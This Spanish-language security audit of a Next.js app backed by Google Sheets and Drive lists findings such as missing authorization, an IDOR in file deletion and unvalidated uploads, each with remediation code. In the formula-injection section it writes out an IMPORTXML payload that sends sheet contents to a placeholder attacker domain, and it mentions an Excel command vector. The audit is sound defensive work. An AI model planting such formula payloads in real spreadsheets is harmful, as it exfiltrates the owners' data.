# Auditoría de seguridad — Registro de Consumos (Next.js 16 / App Router)

**Fecha:** 2026-08-27
**Alcance:** todo el código fuente del repositorio (`app/`, `components/`, `lib/`, `proxy.js`, `next.config.mjs`, `apps-script.gs`), historial de git y dependencias declaradas.
**Rama auditada:** `main` @ `fc8d934`
**Fuera de alcance:** `_legacy/`, `_design_source/`, `design-canvas.jsx` (prototipos archivados, excluidos del build por `.vercelignore`).

---

## 0. Resumen ejecutivo

La aplicación tiene una base defensiva **mejor que el promedio** en varios puntos difíciles: no hay secretos en el código ni en el historial, ninguna variable `NEXT_PUBLIC_` filtra datos de servidor, la sesión usa cookie `HttpOnly` con token HMAC y comparación en tiempo constante, no existe un solo `dangerouslySetInnerHTML`, y las 12 rutas de `/api/migracion/*` están correctamente bloqueadas fuera de desarrollo.

El problema estructural es otro y atraviesa todo el reporte: **la única barrera de autenticación de la aplicación es `proxy.js`, y esa barrera está apagada por defecto.** Ninguna de las 18 Server Actions ni ninguna de las rutas de API verifica autorización por su cuenta. Con `SITE_PASSWORD` vacía —el default documentado en `.env.local.example:43`— cualquier persona en Internet puede escribir en la planilla de la empresa, subir archivos a Drive, mandar a la papelera cualquier archivo que la service account alcance, y volcar el inventario completo de la planilla por `GET`.

### Tabla de hallazgos

| # | Hallazgo | Ubicación | Riesgo |
|---|---|---|---|
| 1 | Server Actions sin ninguna verificación de autorización | `app/actions/*.js` (18 actions) | **Crítico** |
| 2 | `SITE_PASSWORD` vacía = aplicación totalmente abierta, sin señal de alerta | `lib/auth/acceso.js:28-30` | **Crítico** |
| 3 | `/api/diagnostico/hojas` y `/numeros-cliente` sin bloqueo de producción: vuelcan la planilla | `app/api/diagnostico/hojas/route.js:31`, `numeros-cliente/route.js:45` | **Alto** |
| 4 | IDOR en `deleteMedidorDocAction`: borra cualquier `fileId` que reciba | `app/actions/medidores.js:80-86` | **Alto** |
| 5 | Inyección de fórmulas en Google Sheets (`USER_ENTERED`) | `lib/google/sheets-api.js:198` | **Alto** |
| 6 | Subida de archivos sin validación de tipo ni tamaño en el servidor | `lib/drive.js:21-32`, `lib/domain/archivos.js` | **Alto** |
| 7 | Ausencia total de cabeceras de seguridad (CSP, HSTS, X-Frame-Options…) | `next.config.mjs` | **Alto** |
| 8 | `xlsx@0.18.5` con CVEs sin parche en npm, parseando archivos de usuario | `package.json:14` | **Alto** |
| 9 | `/exec` de Apps Script público y sin autenticar: relay de correo con inyección de contenido | `apps-script.gs:189-203`, `:446-483` | **Alto** |
| 10 | Scripts de terceros desde CDN sin SRI en el reporte | `lib/reportes/medidores-html.js:~424` | **Medio** |
| 11 | Open redirect por barra invertida en `?volver=` | `app/acceso/page.jsx:20`, `proxy.js:41` | **Medio** |
| 12 | `/api/diagnostico/exec-post` habilitada en producción; escribe en Drive y amplifica tráfico | `app/api/diagnostico/exec-post/route.js` | **Medio** |
| 13 | Entrada de cliente deserializada sin validación de esquema | `app/actions/records.js:25,39`, `medidores.js:66`, `extraer.js:21` | **Medio** |
| 14 | Sesión no revocable individualmente; `salir` no invalida el token | `lib/auth/acceso.js:89-107`, `app/actions/acceso.js:94-99` | **Medio** |
| 15 | `/api/health` expone `spreadsheetUrl`, `clientEmail` y estructura de la planilla | `app/api/health/route.js:43-46` | **Medio** |
| 16 | Parseo de PDF/XLSX no confiable sin límites de recursos | `lib/extractores/texto-pdf.js`, `iconstruye.js:33` | **Medio** |
| 17 | Rate limiting solo en el login, en memoria y por instancia | `app/actions/acceso.js:28-53` | **Medio** |
| 18 | `esc()` no escapa la comilla simple | `lib/reportes/medidores-html.js:33-34` | **Bajo** |
| 19 | `bodySizeLimit: 25mb` accesible sin autenticar | `next.config.mjs:29` | **Bajo** |
| 20 | Mensajes de error que revelan configuración interna | `lib/backend-flag.js:26`, varios `route.js` | **Bajo** |
| 21 | `X-Powered-By` y `/api/version` revelan stack y deploy | `next.config.mjs`, `app/api/version/route.js` | **Bajo** |

---

## 1. Filtración de secretos y variables de entorno

### 1.1 Lo que está bien — sin observaciones

Este bloque es el más sólido de la auditoría. Se verificó y **no hay hallazgos negativos** en los puntos pedidos:

- **Sin credenciales hardcodeadas.** Las siete variables sensibles (`APPS_SCRIPT_URL`, `SITE_PASSWORD`, `GOOGLE_CLIENT_EMAIL`, `GOOGLE_PRIVATE_KEY`, `SPREADSHEET_ID`, `SPREADSHEET_URL`, `RC_SDK_ACTIONS`) se leen exclusivamente de `process.env` y están centralizadas en `lib/instance.js:32-83`. No aparece ninguna clave, token ni URL de `/exec` literal en el código.
- **Sin `NEXT_PUBLIC_`.** Un `grep` sobre `app/`, `components/` y `lib/` devuelve cero usos: las cinco apariciones del término son comentarios que explican por qué *no* se usa el prefijo. Es la decisión correcta y está bien documentada en `lib/auth/acceso.js:5-13`.
- **Historial de git limpio.** 150 commits revisados con `git log --all -S` sobre `PRIVATE KEY`, `AIza`, `client_secret`, `BEGIN RSA`: cero coincidencias. El único archivo de entorno que existió alguna vez en el índice es `.env.local.example`, y está vacío de valores.
- **`.gitignore` bien diseñado.** El patrón `.env*` con excepción explícita `!.env.local.example` (`.gitignore:16-17`) es más robusto que el `.env*.local` habitual, y hay patrones dedicados para JSON de service account (`.gitignore:21-24`). El comentario explica el razonamiento — buena práctica.
- **`server-only` aplicado.** `lib/instance.js:1`, `lib/apps-script.js:1`, `lib/google/auth.js:1`, `lib/drive.js:1` y `lib/reportes/medidores-html.js:1` importan `server-only`, lo que rompe el build si un componente cliente los importa por accidente. Es una defensa estructural, no un comentario.

### 1.2 [Medio] `/api/health` expone identidad y estructura del backend

**Ubicación:** `app/api/health/route.js:43-46`, alimentado por `lib/data.js:39-45` y `lib/google/auth.js:83-99`.

La respuesta incluye `spreadsheetUrl` (URL directa de la planilla), `clientEmail` (el correo de la service account), el título de la planilla, y la lista de todas las hojas con su `sheetId`, filas y columnas. Además, `estadoFlag()` devuelve el contenido de `RC_SDK_ACTIONS`.

**Por qué es un riesgo.** El comentario del archivo dice "No expone la URL del /exec ni la clave privada, solo si están presentes" — es cierto para esas dos, pero `spreadsheetUrl` y `clientEmail` sí salen. Conocer el `clientEmail` de la service account permite a un atacante intentar ingeniería social contra el administrador de Drive ("compartí esta carpeta con `x@y.iam.gserviceaccount.com`") y confirma la superficie de ataque. La URL de la planilla es útil si alguna vez se comparte de más. `proxy.js:22` documenta correctamente que esta ruta **no** está en `PUBLICAS`, así que queda tras el muro — pero el muro está apagado por defecto (hallazgo 2.2).

**Solución.** Reducir la respuesta a booleanos y mover el detalle tras una comprobación explícita:

```js
// app/api/health/route.js
export async function GET() {
  const detallado = process.env.NODE_ENV !== "production";

  const sdk = isSdkConfigured() ? await probar(sdkPing) : { ok: false, error: "sin credenciales" };

  const cuerpo = {
    empresa: EMPRESA,
    configured: hayBackend(),
    appsScript: { ok: appsScript.ok },
    sdk: { ok: sdk.ok },
  };

  // El detalle (clientEmail, hojas, spreadsheetUrl, RC_SDK_ACTIONS) solo en local.
  if (detallado) Object.assign(cuerpo, { ...instanceInfo(), migracion: estadoFlag(), appsScript, sdk });

  return NextResponse.json(cuerpo, { status: appsScript.ok || sdk.ok ? 200 : 502 });
}
```

Y en `lib/google/auth.js:97`, quitar `clientEmail` de la respuesta de `sdkPing()` o devolver solo el dominio.

### 1.3 [Bajo] Mensajes de error que nombran variables de entorno

**Ubicación:** `lib/backend-flag.js:23-31`, `lib/apps-script.js:62`, `lib/apps-script.js:112-120`.

`SdkHabilitadoSinCredencialesError` produce `RC_SDK_ACTIONS incluye "read" pero el SDK no está configurado: falta GOOGLE_PRIVATE_KEY.` Ese mensaje viaja al cliente porque `lib/result.js:13` devuelve `err.message` textual al navegador (una decisión deliberada y en general acertada, para que el usuario lea "carpeta sin configurar").

**Por qué es un riesgo.** Bajo, pero real: le confirma a un atacante qué backend hay detrás, cómo se llaman las variables y en qué estado está el deploy. Es reconocimiento gratuito.

**Solución.** Separar el mensaje de operador del mensaje de usuario en `lib/result.js`:

```js
// lib/result.js
const ERRORES_INTERNOS = ["SdkHabilitadoSinCredencialesError", "SdkNotConfiguredError", "BackendNotConfiguredError", "SoloSdkError"];

export async function run(fn) {
  try {
    const data = await fn();
    return { ok: true, ...(data && typeof data === "object" ? data : { data }) };
  } catch (err) {
    console.error("[rc:action]", err);           // el detalle completo, en el log
    if (process.env.NODE_ENV === "production" && ERRORES_INTERNOS.includes(err.name)) {
      return { ok: false, error: "El servicio no está disponible. Avisa a soporte." };
    }
    return { ok: false, error: err.message || "Error inesperado" };
  }
}
```

---

## 2. Seguridad en Server Components y Server Actions

### 2.1 [CRÍTICO] Ninguna Server Action verifica autenticación ni autorización

**Ubicación:** las 18 actions de `app/actions/records.js`, `config.js`, `medidores.js`, `fotos.js`, `extraer.js`. Ninguna contiene una llamada a `tokenValido()`, `cookies()` ni ninguna comprobación equivalente.

Ejemplo representativo (`app/actions/config.js:66-72`):

```js
export async function replaceSucursalesAction(sucursales) {
  return run(async () => {
    await writeSucursales(sucursales);   // reescribe la tabla completa de sucursales
    revalidateTag(TAGS.sucursales);
    return {};
  });
}
```

**Por qué es un riesgo.** Esto es el hallazgo central de la auditoría y tiene dos filos.

*Filo A — la documentación oficial de Next.js es explícita:* una Server Action es un endpoint HTTP público. Next genera un ID por action y lo expone; cualquiera puede hacer `POST` con la cabecera `Next-Action: <id>` y el cuerpo serializado. La protección de rutas por middleware **no** cubre esas invocaciones de forma fiable, porque el ID de action se resuelve contra el manifiesto del build y no contra la ruta por la que entró el request. En esta aplicación `/acceso` está en `PUBLICAS` (`proxy.js:14`), así que existe al menos una ruta que el muro deja pasar y desde la cual intentar la invocación. La guía de Next es inequívoca: *la autorización se verifica dentro de la action*.

*Filo B — el muro es una sola contraseña compartida.* Incluso funcionando perfectamente, `proxy.js` no responde "quién": `lib/auth/acceso.js:16` lo admite ("No sirve para saber QUIÉN entró"). No hay roles. Cualquiera que pase el muro puede llamar a `replaceSucursalesAction` y reescribir la configuración completa, o a `deleteSucursalAction`. Los fusibles `MAX_BORRADOS` (`medidores.js:21`) y `MAX_BORRADOS_EMISIONES` (`config.js:78`) son excelentes contra el error accidental, pero un atacante simplemente manda 199 borrados por vez.

**Solución, paso a paso.**

**Paso 1** — un guard reutilizable, del lado servidor:

```js
// lib/auth/guard.js
import "server-only";
import { cookies } from "next/headers";
import { COOKIE_ACCESO, muroActivo, tokenValido } from "./acceso";

export class NoAutorizadoError extends Error {
  constructor() {
    super("Sesión expirada o inválida. Vuelve a ingresar.");
    this.name = "NoAutorizadoError";
  }
}

/**
 * Verifica la sesión DENTRO de la action. `proxy.js` filtra navegaciones; esto
 * cubre la invocación directa del endpoint de la action, que el proxy no ve como
 * la ruta que el atacante eligió.
 */
export async function exigirSesion() {
  if (!muroActivo()) {
    // En producción, sin muro configurado, se falla cerrado en vez de abierto.
    if (process.env.NODE_ENV === "production") throw new NoAutorizadoError();
    return { modo: "local" };
  }
  const token = (await cookies()).get(COOKIE_ACCESO)?.value;
  if (!(await tokenValido(token))) throw new NoAutorizadoError();
  return { modo: "sesion" };
}
```

**Paso 2** — aplicarlo en `run()`, para no depender de recordar 18 veces lo mismo. Se agrega una variante que exige sesión y se convierte en el default:

```js
// lib/result.js
import { exigirSesion } from "./auth/guard";

/** Para actions autenticadas. Es el default: usar `runPublico` es la excepción. */
export async function run(fn) {
  try {
    await exigirSesion();          // <-- el guard, antes de tocar nada
    const data = await fn();
    return { ok: true, ...(data && typeof data === "object" ? data : { data }) };
  } catch (err) {
    console.error("[rc:action]", err);
    return { ok: false, error: err.message || "Error inesperado" };
  }
}

/** Solo para `ingresarAction`, que por definición corre sin sesión. */
export async function runPublico(fn) { /* el `run` actual, sin el guard */ }
```

**Paso 3** — `app/actions/acceso.js:69` y `:95` pasan a usar `runPublico`. Todo el resto queda cubierto sin tocar una línea más, porque las 17 actions restantes ya usan `run`. Es el cambio de menor superficie posible dado el diseño actual, y ese diseño (un solo `run` compartido) es lo que lo hace viable.

**Paso 4** — verificar en los Server Components que leen datos. `app/dashboard/page.jsx`, `app/configuracion/page.jsx` y el resto quedan cubiertos por `proxy.js` para la navegación normal, pero conviene agregar `await exigirSesion()` en las páginas que exponen datos de la planilla, como defensa en profundidad ante un fallo del matcher del proxy.

### 2.2 [CRÍTICO] `SITE_PASSWORD` vacía deja la aplicación abierta, en silencio

**Ubicación:** `lib/auth/acceso.js:27-30`, `proxy.js:29`, `.env.local.example:30-31`.

```js
/** Sin contraseña configurada el muro no existe y la app queda abierta. */
export function muroActivo() {
  return passwordDelSitio().length > 0;
}
```

Y en `proxy.js:29`: `if (!muroActivo()) return NextResponse.next();`

**Por qué es un riesgo.** El comportamiento está documentado y es cómodo para desarrollo local, pero es un **fail-open en producción**. Un deploy en el que alguien olvidó la variable, la borró del panel de Vercel, o la escribió con un typo, queda completamente abierto: escritura en la planilla de la empresa, subida a Drive, borrado de archivos, y volcado de datos — todo sin credenciales. Y nada avisa: la aplicación se ve y funciona idéntica. Peor todavía, `app/actions/acceso.js:71-74` responde `{ entro: true, sinMuro: true }`, así que hasta la pantalla de ingreso simula éxito.

Esto además convierte los hallazgos 3.1, 2.1, 2.3 y 2.4 de "requiere la contraseña compartida" en "no requiere nada".

**Solución.** Fallar cerrado en producción. El default cómodo se mantiene solo fuera de producción:

```js
// lib/auth/acceso.js
export function muroActivo() {
  return passwordDelSitio().length > 0;
}

/**
 * ¿Es válida la configuración del muro? En producción, sin contraseña, NO: la app
 * quedaría abierta a Internet y eso nunca es lo que se quiso. Falla cerrado.
 */
export function muroMalConfigurado() {
  return process.env.NODE_ENV === "production" && !muroActivo();
}
```

```js
// proxy.js
export async function proxy(request) {
  if (muroMalConfigurado()) {
    // Un 503 explícito, no un sitio abierto. El operador lo ve en el primer request.
    return new NextResponse("Configuración incompleta: falta SITE_PASSWORD.", { status: 503 });
  }
  if (!muroActivo()) return NextResponse.next();
  // …resto igual
}
```

Complementos recomendados:
1. Exigir una longitud mínima (p. ej. 16 caracteres) y rechazar el arranque si no se cumple.
2. Agregar la comprobación a `/api/health` como campo `muro: "activo" | "APAGADO"`, para que se vea en el monitoreo.
3. Documentar en `.env.local.example:43` que en cualquier deploy la variable es **obligatoria**, no "conviene ponerla".

### 2.3 [Alto] IDOR: `deleteMedidorDocAction` borra cualquier archivo que reciba

**Ubicación:** `app/actions/medidores.js:79-86` → `lib/drive.js:40-43`.

```js
export async function deleteMedidorDocAction(fileId) {
  return run(async () => {
    await trashInDrive(fileId);      // ningún chequeo de pertenencia
    revalidateTag(TAGS.medidores);
    return {};
  });
}
```

**Por qué es un riesgo.** `fileId` llega íntegro del cliente y va directo a la API de Drive con las credenciales de la service account, que tiene scope `https://www.googleapis.com/auth/drive` completo (`lib/google/auth.js:25-28`) y es miembro de la Unidad compartida. No se comprueba que el archivo esté referenciado por alguna fila de la hoja `Lecturas Medidor`, ni que resida en alguna de las ~25 carpetas de `driveFolders`. Cualquiera que llegue a la action puede mandar a la papelera **cualquier archivo de la Unidad compartida**, incluidos los adjuntos históricos de otras sucursales o documentos de otros equipos que compartan esa unidad. Es destrucción de datos, recuperable 30 días pero silenciosa.

Contrastar con `uploadMedidorDocAction` (`medidores.js:60-77`), que sí hace lo correcto: el `folderId` se **deriva en el servidor** con `medidorFolder(folders, kind, meter.type)` y nunca llega del cliente. Ese es el patrón a replicar.

**Solución.** Verificar pertenencia antes de borrar. Dos capas:

```js
// lib/google/drive-api.js — agregar
/** ¿Está el archivo dentro de alguna de las carpetas que administra la app? */
export async function esArchivoDeLaApp(fileId, idsPermitidos) {
  const padres = await padresDe(fileId);           // ya existe en este módulo
  return (padres || []).some((p) => idsPermitidos.has(p));
}
```

```js
// app/actions/medidores.js
import { getDriveFolders } from "@/lib/drive-folders";
import { esArchivoDeLaApp } from "@/lib/google/drive-api";

/** Todos los IDs de carpeta de `driveFolders`, aplanados. */
function idsDeCarpetas(folders, out = new Set()) {
  for (const v of Object.values(folders || {})) {
    if (typeof v === "string" && v) out.add(v);
    else if (v && typeof v === "object") idsDeCarpetas(v, out);
  }
  return out;
}

export async function deleteMedidorDocAction(fileId) {
  return run(async () => {
    if (!fileId || typeof fileId !== "string" || !/^[A-Za-z0-9_-]{10,}$/.test(fileId)) {
      throw new Error("Identificador de archivo inválido.");
    }
    // El archivo tiene que vivir en una carpeta de la app. Sin esto, `fileId` es
    // una llave maestra sobre toda la Unidad compartida.
    const permitidas = idsDeCarpetas(await getDriveFolders());
    if (!(await esArchivoDeLaApp(fileId, permitidas))) {
      throw new Error("Ese archivo no pertenece a este módulo.");
    }
    await trashInDrive(fileId);
    revalidateTag(TAGS.medidores);
    return {};
  });
}
```

La capa más fuerte, si se quiere ir un paso más allá: exigir además que el `fileId` figure en la columna `Factura File ID` / `Pago File ID` / `Respaldo File ID` de la hoja `Lecturas Medidor`. Encarece la action en una lectura cacheada y cierra el caso por completo.

### 2.4 [Alto] Inyección de fórmulas en Google Sheets

**Ubicación:** `lib/google/sheets-api.js:198` (`export const MODO_ESCRITURA = "USER_ENTERED"`), aplicado en `agregarFilas:242`, `reemplazarHoja:295`, `escribirCeldas:452` y `escribirFilas:487`. Alcanzable desde `editRecordAction` (`app/actions/records.js:49`), `submitManualAction`, `saveSucursalAction`, `saveMedidoresPatchAction` y `saveEmissionsPatchAction`.

**Por qué es un riesgo.** `USER_ENTERED` le dice a Google que interprete el string como si una persona lo hubiera tipeado. Un valor de texto que empieza con `=`, `+`, `-` o `@` se guarda como **fórmula ejecutable**. Es el caso clásico de *formula injection*, y en Google Sheets es más grave que en Excel porque existen funciones con acceso a red:

```
=IMPORTXML(CONCAT("https://atacante.example/?fuga=", TEXTJOIN(",",1,A1:Z100)), "//a")
```

Escrito en una celda de `Config Sucursales` mediante `saveSucursalAction`, Google lo evalúa del lado del servidor de Sheets y **exfiltra el contenido de la planilla** al dominio del atacante, sin que nadie abra nada. Variantes con `IMAGE()` y `HYPERLINK()` logran lo mismo o construyen phishing dentro de la planilla. Y el payload viaja después al reporte HTML, al Excel exportado (`lib/reportes/medidores-excel.js`) y a cualquier consumidor de esa hoja.

El módulo documenta que eligió `USER_ENTERED` deliberadamente, para imitar el `setValues()` del Apps Script y no romper `parseDate`/`toNumber` (`sheets-api.js:190-198`). El razonamiento es correcto para fechas y números, pero se aplica indiscriminadamente a **todas** las columnas, incluidas las de texto libre (nombre de sucursal, proveedor, notas, nombre de medidor).

**Solución.** Neutralizar el prefijo peligroso en los valores que son texto, conservando `USER_ENTERED` para fechas y números —que es lo que el modo necesita:

```js
// lib/google/sheets-api.js
/**
 * Desactiva la interpretación como fórmula. `USER_ENTERED` es necesario para que
 * "31-07-26" quede fecha y "20.440" quede número, pero convierte cualquier texto
 * que empiece con = + - @ en una fórmula EJECUTABLE — y Sheets tiene IMPORTXML,
 * que hace pedidos de red desde el servidor de Google. Un nombre de sucursal no
 * tiene por qué poder eso.
 *
 * El apóstrofo inicial es la forma canónica de Sheets de decir "esto es texto":
 * no se muestra en la celda y no altera el valor leído.
 */
export function neutralizarFormula(v) {
  if (typeof v !== "string") return v;                 // números y fechas, intactos
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}
```

Aplicarlo en el punto de entrada de cada escritura de texto. Lo más robusto es hacerlo en `rectangular()` (`sheets-api.js:131`), por donde ya pasan las filas antes de escribirse, con una lista de columnas exentas si alguna necesitase fórmulas reales (hoy ninguna las necesita):

```js
export function rectangular(filas) {
  const ancho = Math.max(0, ...filas.map((f) => f.length));
  return filas.map((f) => {
    const fila = [...f.map(neutralizarFormula)];
    while (fila.length < ancho) fila.push("");
    return fila;
  });
}
```

Y en `escribirCeldas`/`escribirFilas`, envolver `c.value` y `f.values` con la misma función. Complemento: en `medidores-excel.js`, aplicar el mismo saneo antes de `aoa_to_sheet`, porque el CSV/XLSX exportado se abre en Excel y ahí `=cmd|…` es ejecución de comandos.

### 2.5 [Alto] Subida de archivos sin validación en el servidor

**Ubicación:** `lib/drive.js:21-32`, invocado desde `app/actions/medidores.js:73`, `app/actions/records.js:63` (`attachDocument`) y `lib/sheets/fotos.js` (`uploadFoto`). Los límites viven en `lib/domain/archivos.js` y se aplican **solo en el cliente**.

```js
export async function uploadToDrive(file, folderId, subfolders = []) {
  if (!folderId) throw new Error("Carpeta de Drive no configurada.");
  const base64 = Buffer.from(await file.arrayBuffer()).toString("base64");
  return apiPost({
    action: "upload",
    name: file.name,                                       // sin sanear
    mimeType: file.type || "application/octet-stream",      // lo declara el cliente
    base64, folderId, subfolders,
  });
}
```

**Por qué es un riesgo.** Tres cosas a la vez:

1. **`MAX_ARCHIVO_BYTES` y `MAX_LOTE_BYTES` no se aplican en el servidor.** `lib/domain/archivos.js:1-11` lo dice: se valida "antes de enviar". Un cliente que no sea el navegador de la aplicación —`curl`— sube hasta los 25 MB del `bodySizeLimit`, y el archivo entero se carga en memoria de la función serverless (`file.arrayBuffer()`) y después se duplica en base64 (+33 %). Vía de agotamiento de memoria.
2. **El `mimeType` lo declara el cliente.** No se verifica contra los bytes reales. Un `.html`, `.svg` o ejecutable entra al Drive de la empresa con el tipo que el atacante quiera, y el `webViewLink` resultante se guarda en la planilla y se manda por correo (`notifyFotoPending`) como si fuera una factura legítima. Drive mitiga bastante el XSS almacenado al no servir HTML crudo, pero el vector de phishing interno queda intacto: un enlace de un dominio de confianza (`drive.google.com`) enviado desde la cuenta de la empresa.
3. **`file.name` va sin sanear.** `meterFolderName` (`lib/drive.js:49-53`) sí limpia `/` y `\` para el nombre de subcarpeta —buen detalle— pero el nombre del archivo pasa entero.

**Solución.**

```js
// lib/domain/archivos.js — agregar (isomorfo, sin dependencias, como el resto del módulo)

/** Lo que la app acepta como adjunto. Todo lo demás se rechaza. */
export const MIME_PERMITIDOS = new Set([
  "application/pdf",
  "image/jpeg", "image/png", "image/webp", "image/heic",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.ms-excel",
]);

/** Firma real del archivo, por sus primeros bytes. El mimeType del cliente miente. */
export function tipoRealDe(bytes) {
  const b = new Uint8Array(bytes.slice(0, 8));
  const hex = [...b].map((x) => x.toString(16).padStart(2, "0")).join("");
  if (hex.startsWith("25504446")) return "application/pdf";            // %PDF
  if (hex.startsWith("ffd8ff")) return "image/jpeg";
  if (hex.startsWith("89504e47")) return "image/png";
  if (hex.startsWith("504b0304")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"; // zip → xlsx
  if (hex.startsWith("d0cf11e0")) return "application/vnd.ms-excel";
  return null;
}

/** Nombre seguro para Drive: sin rutas, sin control, con largo acotado. */
export function nombreSeguro(nombre) {
  return String(nombre || "adjunto")
    .replace(/[/\\]/g, "-")
    .replace(/[ -]/g, "")
    .replace(/^\.+/, "")
    .slice(0, 200)
    .trim() || "adjunto";
}
```

```js
// lib/drive.js
import { MAX_ARCHIVO_BYTES, MIME_PERMITIDOS, nombreSeguro, tamanoLegible, tipoRealDe } from "./domain/archivos";

export async function uploadToDrive(file, folderId, subfolders = []) {
  if (!folderId) throw new Error("Carpeta de Drive no configurada.");

  // Los límites de lib/domain/archivos.js se validaban SOLO en el cliente, así que
  // no eran un límite: `curl` los ignoraba. Acá sí lo son.
  if (file.size > MAX_ARCHIVO_BYTES) {
    throw new Error(`El archivo pesa ${tamanoLegible(file.size)}; el máximo es ${tamanoLegible(MAX_ARCHIVO_BYTES)}.`);
  }

  const buf = await file.arrayBuffer();
  const real = tipoRealDe(buf);
  if (!real || !MIME_PERMITIDOS.has(real)) {
    throw new Error("Tipo de archivo no permitido. Se aceptan PDF, imágenes y planillas Excel.");
  }

  return apiPost({
    action: "upload",
    name: nombreSeguro(file.name),
    mimeType: real,                  // el tipo REAL, no el que declaró el cliente
    base64: Buffer.from(buf).toString("base64"),
    folderId,
    subfolders: (subfolders || []).filter(Boolean),
  });
}
```

Aplicar `errorLote()` también del lado servidor en las actions que reciben varios archivos (`submitManualAction`, `submitUploadAction`), recorriendo `collectFiles` antes de procesar.

### 2.6 [Medio] Entrada del cliente deserializada sin validación de esquema

**Ubicación:** `app/actions/records.js:25` y `:39`, `app/actions/medidores.js:66`, `app/actions/extraer.js:21`, más los parámetros de objeto de `saveMedidoresPatchAction`, `saveEmissionsPatchAction`, `completeFotoAction` y `exportMedidoresExcelAction`.

```js
const records = JSON.parse(formData.get("records") || "[]");   // records.js:25
const meter = JSON.parse(formData.get("meter") || "null");      // medidores.js:66
const provider = JSON.parse(formData.get("provider") || "{}");  // extraer.js:21
```

**Por qué es un riesgo.** Ningún `JSON.parse` valida forma, tipo ni tamaño de lo que sale. Consecuencias concretas: un `records` con 100 000 entradas produce 100 000 filas en la planilla o revienta la cuota de la API de Sheets (60 lecturas/minuto, ya identificada como frágil en `lib/apps-script.js:34-37`); un `patch` con estructura inesperada llega hasta `upsertMedidores` y puede escribir donde no corresponde; `completeFotoAction({ rowIndex })` recibe un índice de fila crudo del cliente y lo usa para escribir. No hay riesgo de inyección SQL —no hay base de datos, la persistencia es Google Sheets vía SDK con rangos A1 correctamente escapados (ver 2.7)— pero sí de corrupción de datos y agotamiento de cuota.

**Solución.** Validar en el borde de cada action. El proyecto no tiene Zod entre sus dependencias y el estilo del código es explícito y sin librerías; se puede mantener así:

```js
// lib/domain/validar.js
const MAX_REGISTROS_POR_ENVIO = 500;

export function parsearRegistros(crudo) {
  let v;
  try { v = JSON.parse(crudo || "[]"); } catch { throw new Error("Datos malformados."); }
  if (!Array.isArray(v)) throw new Error("Se esperaba una lista de registros.");
  if (v.length > MAX_REGISTROS_POR_ENVIO) {
    throw new Error(`El envío trae ${v.length} registros y el máximo es ${MAX_REGISTROS_POR_ENVIO}.`);
  }
  // Solo los campos que la app escribe. Un objeto con claves de más las pierde acá,
  // en vez de llevarlas hasta la fila del Sheet.
  return v.map((r) => ({
    type: String(r?.type ?? ""),
    subcat: String(r?.subcat ?? ""),
    sucursal: String(r?.sucursal ?? "").slice(0, 200),
    provider: String(r?.provider ?? "").slice(0, 200),
    date: r?.date ?? null,
    cantidad: Number.isFinite(Number(r?.cantidad)) ? Number(r.cantidad) : null,
    costo: Number.isFinite(Number(r?.costo)) ? Number(r.costo) : null,
    numeroCliente: String(r?.numeroCliente ?? "").slice(0, 60),
  }));
}
```

Y en `records.js:25`: `const records = parsearRegistros(formData.get("records"));`. Análogo para `meter`, `provider`, `patch` y `rowIndex` (que además debe validarse como entero positivo dentro del rango de la hoja).

### 2.7 Sin observaciones: inyección SQL y construcción de rangos

Se buscó específicamente y **no hay hallazgos**:

- **No hay SQL.** La persistencia es Google Sheets vía `googleapis`. No existe superficie de inyección SQL.
- **Los nombres de hoja se escapan correctamente** al construir rangos A1: `lib/google/sheets-api.js:162`, `:211`, `:241` usan `` `'${nombre.replace(/'/g, "''")}'` ``, que es el escape canónico de Sheets. Un nombre con apóstrofo no rompe el rango ni lo extiende. Bien hecho.
- **`updateRecordField` valida el campo contra una lista blanca** (`lib/sheets/records.js:305-308`): `layout.cols[field]` — un `field` arbitrario da error en vez de escribir en una columna cualquiera. Es exactamente el patrón correcto.
- **No hay `eval`, `new Function` ni `child_process`** en `app/`, `components/` ni `lib/`.
- **Las cuatro actions `upsert*`** trabajan con patches por clave en vez de reescribir hojas completas (`ARQUITECTURA.md`, `app/actions/medidores.js:23-31`), lo que elimina toda una clase de pérdida de datos por concurrencia. Es una decisión de diseño sólida.

---

## 3. Rutas de API

### 3.1 [Alto] `/api/diagnostico/hojas` y `/api/diagnostico/numeros-cliente` sin bloqueo de producción

**Ubicación:** `app/api/diagnostico/hojas/route.js:31`, `app/api/diagnostico/numeros-cliente/route.js:45`.

Las 12 rutas de `/api/migracion/*` y `/api/diagnostico/drive` empiezan con el mismo guard:

```js
if (process.env.NODE_ENV === "production") {
  return NextResponse.json({ error: "solo disponible en desarrollo" }, { status: 404 });
}
```

**Estas dos no lo tienen.** Un `GET` sin más las ejecuta en producción.

**Por qué es un riesgo.** `/hojas` recorre **todas** las hojas de la planilla y devuelve nombres, cantidad de filas de datos y encabezados reales cuando difieren de los esperados. Es un mapa completo de la estructura de datos de la empresa. `/numeros-cliente` es peor: devuelve **valores reales**, con nombre de sucursal, número de fila y número de cliente (`numeros-cliente/route.js:59-73` y `:90-124`), es decir identificadores de cuentas de servicios básicos de la empresa junto a la sucursal a la que pertenecen. Ambas hacen además una lectura completa de la planilla por llamada, así que repetirlas agota la cuota de Sheets (60 lecturas/minuto) y provoca una denegación de servicio en toda la aplicación.

Hoy quedan tras `proxy.js` — pero eso significa "protegidas por una contraseña compartida", y con `SITE_PASSWORD` vacía (hallazgo 2.2), por nada. El propio código reconoce que son de desarrollo: `/hojas:12` dice "Solo lectura" y `/numeros-cliente:28` dice "Este endpoint es de solo lectura: no arregla nada, reporta" — pero el comentario no es un guard.

**Solución.** Extraer el guard a un helper compartido y aplicarlo a las dos rutas. Es el único hallazgo de esta auditoría que se arregla en cuatro líneas:

```js
// lib/api/solo-desarrollo.js
import { NextResponse } from "next/server";

/**
 * Corta la ruta fuera de desarrollo. Devuelve una Response si hay que cortar, o
 * null si se puede seguir. Estaba copiado en 13 rutas y faltaba en dos: un guard
 * duplicado a mano se olvida, y las dos que se olvidaron vuelcan datos reales.
 */
export function soloDesarrollo() {
  if (process.env.NODE_ENV !== "production") return null;
  return NextResponse.json({ error: "solo disponible en desarrollo" }, { status: 404 });
}
```

```js
// app/api/diagnostico/hojas/route.js
import { soloDesarrollo } from "@/lib/api/solo-desarrollo";

export async function GET() {
  const bloqueo = soloDesarrollo();
  if (bloqueo) return bloqueo;
  // …resto igual
}
```

Idéntico en `numeros-cliente/route.js:45`. Y migrar las 13 rutas restantes al helper, para que la próxima ruta de diagnóstico no repita el olvido.

